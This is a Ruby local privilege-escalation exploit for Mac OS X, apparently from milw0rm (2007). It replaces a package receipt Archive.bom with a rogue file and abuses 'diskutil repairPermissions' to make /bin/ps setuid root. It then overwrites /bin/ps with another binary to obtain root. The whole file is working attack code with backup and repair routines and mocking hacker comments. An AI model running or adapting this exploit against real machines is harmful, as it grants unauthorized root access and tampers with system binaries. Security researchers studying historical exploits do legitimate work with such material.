#!/usr/bin/ruby
# (c) 2006 LMH <lmh [at] info-pull.com>
#          Kevin Finisterre <kf_lists [at] digitalmunition.com>
#
# Thanks to The French Connection for bringing this in-the-wild 0-day to
# our attention. If /tmp/ps2 exists on your system, you've been pwned already.
# Thanks to the original authors of the exploit ('meow'). You know who you are.
#
# "They did it for the lulz"   - A Fakecure spokesperson on the 'Mother Of all Bombs'.
# "kcoc kcus I ro tcarter uoY" - The Original Drama P3dobear (Kumo' n').
#

require 'fileutils'

# Basic configuration
TARGET_BINARY       = "/bin/ps"   # Changing this requires you to create a new TEH_EVIL_BOM
TARGET_BACKUP_PATH  = "/tmp/ps2"  # see: "man lsbom" and "man mkbom"
TARGET_SHELL_PATH   = "/usr/bin/id"  # Ensure the binary doesn't drop privileges!
BOMARCHIVE_PATH     = "/Library/Receipts/Essentials.pkg/Contents/Archive.bom"
DISKUTIL_PATH       = "/usr/sbin/diskutil"
TEH_EVIL_BOM        = File.read("Evil.bom")

#
# Repair a rogue installation using the back-up files. Useful for testing.
# Probably you don't want to repair on real pwnage... :-)
#
def do_repair()
  puts "++ Repairing (moving back-ups to original path)"
  puts "++ #{File.basename(BOMARCHIVE_PATH)}"
  FileUtils.rm_f BOMARCHIVE_PATH
  FileUtils.cp File.join("/tmp", File.basename(BOMARCHIVE_PATH)), BOMARCHIVE_PATH
  
  puts "++ #{TARGET_BINARY}"
  FileUtils.rm_f TARGET_BINARY
  FileUtils.cp TARGET_BACKUP_PATH, TARGET_BINARY
  
  puts "++ Removing back-ups..."
  FileUtils.rm_f TARGET_BACKUP_PATH
  FileUtils.rm_f File.join("/tmp", File.basename(BOMARCHIVE_PATH))
  
  puts "++ Done. Repairing disk permissions..."
  exec "#{DISKUTIL_PATH} repairPermissions /"
end

#
# Ovewrite TARGET_BINARY with TARGET_SHELL_PATH and set the rogue permissions unless
# they are already properly set.
#
def exploit_bomb()
  puts "++ We get signal. Overwriting #{TARGET_BINARY} with #{TARGET_SHELL_PATH}."

  # Overwriting with this method will always work well if binary at TARGET_SHELL_PATH
  # is bigger than TARGET_BINARY (ex. /bin/sh is 1068844 bytes and /bin/ps is 68432).
  # An alternative method is running diskutil again to set the rogue permissions.
  over = File.new(TARGET_BINARY, "w")
  over.write(File.read(TARGET_SHELL_PATH))
  over.close
  
  unless FileTest.setuid?(TARGET_BINARY)
    fork do
      FileUtils.rm_f TARGET_BINARY
      FileUtils.cp TARGET_SHELL_PATH, TARGET_BINARY
      exec "#{DISKUTIL_PATH} repairPermissions /"
    end
    Process.wait
  end
  
  puts "++ Done. Happy ruuting."
end

#
# Overwrite the BOM with the rogue version, set new permissions.
#
def set_up_the_bomb()
  puts "++ Preparing to overwrite (#{BOMARCHIVE_PATH})"
  
  # Back-up the original Archive.bom, set mode to 777
  if FileTest.writable?(BOMARCHIVE_PATH)
    backup_path = File.join("/tmp", File.basename(BOMARCHIVE_PATH))
    
    unless FileTest.exists?(backup_path)
      puts "++ Creating backup copy at #{backup_path}"
      FileUtils.cp BOMARCHIVE_PATH, backup_path
    end
  
    puts "++ Removing original file."
    FileUtils.rm_f BOMARCHIVE_PATH
    
    puts "++ Writing backdoor BOM file."
    target_bom = File.new(BOMARCHIVE_PATH, "w")
    target_bom.write(TEH_EVIL_BOM)
    target_bom.close
    puts "++ Done."
  else
    puts "-- Can't write to '#{BOMARCHIVE_PATH}. No pwnage for you today."
    exit
  end
  
  # Back-up the target backdoor path
  unless FileTest.exists?(TARGET_BACKUP_PATH)
    puts "++ Creating backup copy of #{TARGET_BINARY} at #{TARGET_BACKUP_PATH}"
    FileUtils.cp TARGET_BINARY, TARGET_BACKUP_PATH
  end
  
  # Let diskutil do it's job (set permissions over target binary path, setuid)
  puts "++ Running diskutil to set the new permissions for the backdoor..."
  fork do
    exec "#{DISKUTIL_PATH} repairPermissions /"
  end
  Process.wait
  
  puts "++ Somebody set up us the bomb!"
  exploit_bomb()
end

# Here be pwnies
if ARGV[0] == "repair"
  do_repair()
else
  set_up_the_bomb()
end

# milw0rm.com [2007-01-05]
